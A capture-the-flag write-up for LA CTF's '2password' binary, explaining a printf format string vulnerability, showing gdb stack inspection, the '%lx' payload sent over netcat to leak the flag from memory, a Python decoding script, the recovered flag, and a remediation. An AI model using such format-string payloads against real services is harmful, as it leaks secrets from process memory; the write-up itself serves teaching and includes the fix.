
## Context

The `2password` program is an ELF command line executable that prompts the user for a username and two separate passwords. If all three values match what is expected, the string "Access Granted" is printed. In the context of this CTF challenge, the executable is running on a remote server and can be interacted with using a TCP client like netcat.

The C source code is given as part of the challenge, which tells us that the expected username is `kaiphait`, the first expected password is `correct horse battery staple` and the second password is the flag. Unfortunately, the flag is read from a text file named `flag.txt`, which is not given.

## Vulnerability

The input checking logic is implemented as follows:
```c
 char flag[42];
 readline(flag, sizeof flag, flag_file);
 if (strcmp(username, "kaiphait") == 0 &&
     strcmp(password1, "correct horse battery staple") == 0 &&
     strcmp(password2, flag) == 0) {
   puts("Access granted");
 } else {
   printf("Incorrect password for user ");
   printf(username);
   printf("\n");
 }
```

Note that the flag is loaded from disk regardless of whether or not the input credentials are valid. We can also note something very interesting: if the credentials are invalid, `printf` is called with the username as the format specifier string. Since `username` is user input, this makes this program open to a Format String Vulnerability.

Normally, the first argument passed to the `printf`function is the format string, that can optionally contain format specifiers such as `%d` or `%s` which in the output are replaced by the values given by the following arguments. If, however, the number of format specifiers in the format string is larger than the number of following arguments, `printf` will replace them by reading registers and the stack following the program's calling convention.

As this binary is an x86-64 ELF, the calling convention is *System V AMD64*:
| Argument | Register | Notes |
|----------|----------|------|
| 1st | `rdi` | Integer / Pointer |
| 2nd | `rsi` | Integer / Pointer |
| 3rd | `rdx` | Integer / Pointer |
| 4th | `rcx` | Integer / Pointer |
| 5th | `r8` | Integer / Pointer |
| 6th | `r9` | Integer / Pointer |
| 7th+ | Stack | Pushed **right to left** |

The format string itself is the first argument, so, if we can include 6 format specifiers in the username, `printf` should start leaking the stack!

## Exploit

Let's run the given binary in gdb to get a better understanding about how variables are laid out on the stack. I also created a file named `flag.txt` in the same directory with the following content:
```
AAAABBBBCCCCDDDD
```
This pattern should make it easy to recognize the flag in memory. Now, let's run the executable in gdb and enter the main function.

```
gdb ./chall
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04.2) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./chall...
(No debugging symbols found in ./chall)
(gdb) break main
Breakpoint 1 at 0x122d
(gdb) run
Starting program: /home/carl-vbn/chall
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x000055555555522d in main ()
```
We want to inspect the program's state just before `printf` is run, so we can set a breakpoint.

```
(gdb) disassemble main
   ...
   0x000055555555539e <+373>:   mov    %rax,%rdi
   0x00005555555553a1 <+376>:   mov    $0x0,%eax
   0x00005555555553a6 <+381>:   call   0x555555555070 <printf@plt>
   0x00005555555553ab <+386>:   mov    $0xa,%edi
   0x00005555555553b0 <+391>:   call   0x555555555030 <putchar@plt>
   0x00005555555553b5 <+396>:   mov    $0x0,%eax
   0x00005555555553ba <+401>:   leave
   0x00005555555553bb <+402>:   ret
End of assembler dump.
(gdb) break *0x00005555555553a6 
Breakpoint 2 at 0x5555555553a6
(gdb) continue
Continuing.
Enter username: %x %x %x %x %x %x %x
Enter password1: 1234
Enter password2: 5678
Incorrect password for user
Breakpoint 2, 0x00005555555553a6 in main ()
```
Now, let's print out the registers and the contents of the stack around the stack pointer
```
(gdb) info reg
rax            0x0                 0
rbx            0x0                 0
rcx            0x7ffff7ea1887      140737352702087
rdx            0x0                 0
rsi            0x7fffffffbb90      140737488337808
rdi            0x7fffffffdd40      140737488346432
rbp            0x7fffffffdd80      0x7fffffffdd80
rsp            0x7fffffffdcb0      0x7fffffffdcb0
r8             0x1c                28
r9             0x555555559890      93824992254096
r10            0x55555555608d      93824992239757
r11            0x246               582
r12            0x7fffffffde98      140737488346776
r13            0x555555555229      93824992236073
r14            0x555555557dd8      93824992247256
r15            0x7ffff7ffd040      140737354125376
rip            0x5555555553a6      0x5555555553a6 <main+381>
eflags         0x202               [ IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
(gdb) x/40x $sp-20
0x7fffffffdc9c: 0x00007fff      0x00000006      0x00000000      0x5555539a
0x7fffffffdcac: 0x00005555      0x41414141      0x42424242      0x43434343
0x7fffffffdcbc: 0x44444444      0x00000000      0x00000000      0x00000006
0x7fffffffdccc: 0x80000000      0x00000000      0x00000000      0x00000000
0x7fffffffdcdc: 0x00000000      0x38373635      0x00000000      0x00000000
0x7fffffffdcec: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffdcfc: 0x00000000      0x0000000d      0x00000000      0x00000001
0x7fffffffdd0c: 0x00000000      0x34333231      0x00000000      0x00000001
0x7fffffffdd1c: 0x00000000      0x55554040      0x00005555      0xf7fe283c
0x7fffffffdd2c: 0x00007fff      0x000006f0      0x00000000      0xffffe0e9
```
We can clearly see our test flag at address `0x7fffffffdcb0` (`0x41414141`, `0x42424242`, etc). Let's see what gets printed if we continue. The 7 `%x` format specifiers we passed into the username should read the 5 argument registers (not including the first specifying the format string itself) followed by two words from the stack in hexadecimal notation.

```
(gdb) continue
Continuing.
ffffbb90 0 f7ea1887 1c 55559890 41414141 43434343
[Inferior 1 (process 25044) exited normally]
```
As expected, the values of the rsi, rdx, rcx, r8 and r9 registers are printed followed by two stack words, which conveniently are also the first two words of the flag, or so I thought, until I realized that `0x42424242` was missing. This really confused me at first, until I remembered that this was a 64-bit program, meaning each word is 64 bits long, but `%x` only prints the lower 32. Using `%lx` instead led to the expected values being printed, although the byte order in each word gets flipped due to little endianness:
```
Enter username: %lx %lx %lx %lx %lx %lx %lx
Enter password1:
Enter password2:
Incorrect password for user 7ffcac71a3b0 0 7fb82dee1887 1c 5575f971e890 4242424241414141 4444444443434343
```

Let's see if this works on the challenge server as well.
```
nc chall.lac.tf 31142
Enter username: %lx %lx %lx %lx %lx %lx %lx
Enter password1:
Enter password2:
Incorrect password for user 7ffdbae40f20 0 7f79e5353887 1c 55f2e9610890 75687b667463616c 66635f327265746e
```
Converting the last two words to strings using ASCII decoding, we get `uh{ftcal` and `fc_2retn` respectively. The first one is very promising since, it matches the start of the flag prefix `lactf{`, but reversed (due to little endianness). I then kept adding `%lx` format specifiers until I got a null terminator, leading to the following output:  
```
nc chall.lac.tf 31142
Enter username: %lx %lx %lx %lx %lx %lx %lx %lx %lx
Enter password1:
Enter password2:
Incorrect password for user 7ffdcc557620 0 7f33626a7887 1c 5558a11fc890 75687b667463616c 66635f327265746e 7d38367a783063 0
```
I then wrote a short Python script to convert the numbers into a string using ASCII, correcting for endianness:
```py
words = ['75687b667463616c','66635f327265746e','7d38367a783063']
for w in words:
    for i in range(len(w)-2, -1, -2):
      print(chr(int(w[i:i+2],16)), end='')
```
Which gave me the full flag: `lactf{hunter2_cfc0xz68}`

## Remediation

The simplest way to prevent this attack is to consolidate the three `printf` statements into one, so instead of:
```c
printf("Incorrect password for user ");
printf(username);
printf("\n");
```
We would have:
```c
printf("Incorrect password for user %s\n", username);
```

Generally, the first argument of `printf` should never be user input. If we want to print a variable string using `printf`, it should be done like this:
```c
printf("%s", variable_string); // No format specifier injection possible
```


